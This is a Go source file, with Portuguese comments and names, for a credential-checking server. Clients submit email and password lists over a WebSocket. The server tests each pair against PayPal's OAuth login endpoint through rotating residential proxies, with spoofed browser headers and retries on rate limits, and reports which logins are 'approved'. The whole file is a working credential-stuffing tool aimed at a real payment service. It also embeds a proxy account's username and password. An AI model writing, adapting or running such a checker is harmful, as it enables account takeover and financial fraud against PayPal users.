package main

import (
    "github.com/gorilla/websocket"
    "fmt"
    "net/http"
    "sync"
    "strings"
    "regexp"
    urlU "net/url"
    "encoding/json"
    "math/rand"
    "time"
    "strconv"
    "bytes"
    "io/ioutil"
)

const ENVIARTODOS bool = false // Define se o retorno do login sera enviado para todos os clientes conectados

var (
    upgrade *websocket.Upgrader = &websocket.Upgrader{
        ReadBufferSize:  10000,
        WriteBufferSize: 10000,
        EnableCompression: false,
    }

    clientes []*websocket.Conn
    mu *sync.Mutex = &sync.Mutex{}
    newConf requestVars = requestVars{}
    maxRequestAttemps int = 10
    methodType string
    post string
    retorno string
)

type requestVars struct {
    client *http.Client
    request *http.Request
    response *http.Response
    transport *http.Transport 
    data []uint8
    erro error
}

func main() {
    fmt.Println("SERVIDOR INICIADO")
    http.HandleFunc("/", checkerInit)
    http.ListenAndServe(":666", nil)
}

func array_search(array []*websocket.Conn, valor *websocket.Conn) int {
    for _chave,_valor := range array {
        if _valor == valor {
            return _chave
        }
    }
    return -1
}

func checkerInit(clienteWriter http.ResponseWriter, clienteRequest *http.Request) {
    upgrade.CheckOrigin = func(*http.Request) bool { return true }
    cliente, _ := upgrade.Upgrade(clienteWriter, clienteRequest, nil)
    clientes = append(clientes, cliente)

    newCliente, _ := json.Marshal(map[string]interface{}{"clientesTotal": len(clientes), "mensagem": "new.client"})

    enviarTodos(string(newCliente))

    cliente.SetCloseHandler( func(int, string) error {

        for clienteIndex, clienteRemove := range clientes {
            if clienteRemove == cliente {
                clientes = append(clientes[:clienteIndex], clientes[clienteIndex+1:]...)
            }
        }

        disconnectedClient, _ := json.Marshal(map[string]interface{}{"clientesTotal": len(clientes), "mensagem": "disconnected.client"})

        enviarTodos(string(disconnectedClient))
        return nil
    })

    go func() {
        for {
            _, buffer, erro := cliente.ReadMessage()
            if erro != nil { 
                cliente.Close()
                return
            }

            listas := strings.Split(string(buffer), ",")
            canal := make(chan string)

            fmt.Println(fmt.Sprintf("INICIANDO TESTE PARA %d LOGINS, CLIENTE ID: %d", len(listas), array_search(clientes, cliente)+1))

            for _, lista := range listas {
                regexCompiler, _ := regexp.Compile("[|;: ]")
                separar := make([]string, 2)
                copy(separar, regexCompiler.Split(lista, -1))
                email, senha := separar[0], separar[1]
                go func(){
                    if email == "" || senha == ""{
                        canal <- fmt.Sprintf("#Invalida %s | %s", email, senha)
                        return
                    }
                    data := newConf.cUrl("https://checkout.paypal.com/paypal/v1/oauth2/login", "email=" + email + "&password=" + senha + "&grant_type=password&redirect_uri=urn%3Aietf%3Awg%3Aoauth%3A2.0%3Aoob&response_type=access_token&scope=https%3A%2F%2Fapi.paypal.com%2Fv1%2Fpayments%2F.*", map[string]string{"User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36","Accept": "application/json, text/javascript, */*; q=0.01","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Host": "checkout.paypal.com","authorization": "nseicaralhou","Origin": "https://checkout.paypal.com","PayPal-Application-Correlation-Id": "123asdadsasd-sgd23-ga1235-97ahuas89d2-gasd78123yasjd","PayPal-Client-Metadata-Id": "123asdadsasd-sgd23-ga1235-97ahuas89d2-gasd78123yasjd","Referer": "https://checkout.paypal.com/pwpp/2.31.0/html/braintree-frame.html"}, true)

                    var jsonDecode map[string]interface{}
                    json.Unmarshal([]byte(data), &jsonDecode)

                    if strings.Contains(data, "access_token") {
                        retorno = fmt.Sprintf("#Aprovada %s | %s", email, senha)
                    } else {
                        retorno = fmt.Sprintf("#Reprovada %s | %s | Retorno: %s", email, senha, jsonDecode["error_description"])
                    }

                    canal <- retorno
                }()
                
            }

            for i := 0; i < len(listas); i++ {
                if ENVIARTODOS {
                    enviarTodos(<-canal)
                } else {
                    cliente.WriteMessage(websocket.TextMessage, []byte(<-canal))
                }
            }
        }
    }()
}

func (cR requestVars) cUrl(url string, post string, headers map[string]string, useProxy bool) string {
    for i := 0; i < maxRequestAttemps; i++ {
        methodType = map[bool]string{true: "GET", false: "POST"}[post == ""]

        cR.transport = &http.Transport{}

        if useProxy {
            proxyParse, _ := urlU.Parse("http://lum-customer-hl_642f1d14-zone-zone1-session-" + strconv.Itoa(rand.Intn(9999999)) + ":pvane98edgt4@zproxy.lum-superproxy.io:22225")
            cR.transport = &http.Transport{Proxy: http.ProxyURL(proxyParse)}
        }

        cR.client = &http.Client{Transport: cR.transport}

        cR.request, cR.erro = http.NewRequest(methodType, url, bytes.NewBuffer([]byte(post)))
        if cR.erro != nil {continue}
        cR.request.Close = true

        for c, v := range headers { cR.request.Header.Add(c, v) }

        cR.response, cR.erro = cR.client.Do(cR.request)
        if cR.erro != nil {continue}
        defer cR.response.Body.Close()
        cR.data, cR.erro = ioutil.ReadAll(cR.response.Body)
        if cR.erro != nil {continue}

        if strings.Contains(string(cR.data), "RATE_LIMIT_REACHED") {continue}

        break
    }
    return string(cR.data)
}

func enviarTodos(mensagem string){
    for _,cliente := range clientes {
        cliente.WriteMessage(websocket.TextMessage, []byte(mensagem))
    }
}

func init(){
    rand.Seed(time.Now().UTC().UnixNano())
}
